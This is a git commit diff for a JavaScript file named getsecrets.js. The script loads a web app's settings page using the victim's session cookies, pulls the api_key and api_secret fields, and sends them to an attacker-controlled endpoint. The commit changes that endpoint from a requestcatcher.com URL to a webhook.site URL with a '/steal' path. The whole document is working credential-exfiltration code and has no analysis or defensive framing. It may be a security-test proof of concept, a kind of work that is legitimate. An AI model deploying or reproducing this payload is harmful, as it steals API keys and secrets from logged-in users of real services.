ade629dc76456ac2f767bc69dc59a85a3469f2bb
e1n <69242462+du4L5ynchE1n@users.noreply.github.com>
2025-11-06 18:06:52 +0800

    Update getsecrets.js

--- getsecrets.js
+++ getsecrets.js
@@ -5,6 +5,6 @@ fetch("/client/settings/configuration", {credentials:"include"})
     let k=d.querySelector('input[name="api_key"]')?.value;
     let s=d.querySelector('input[name="api_secret"]')?.value;
     if(k&&s){
-      fetch(`https://secuna_seapower.requestcatcher.com/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`);
+      fetch(`https://webhook.site/9a81f804-f264-4195-861d-0452e71c4ca5/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`);
     }
   });
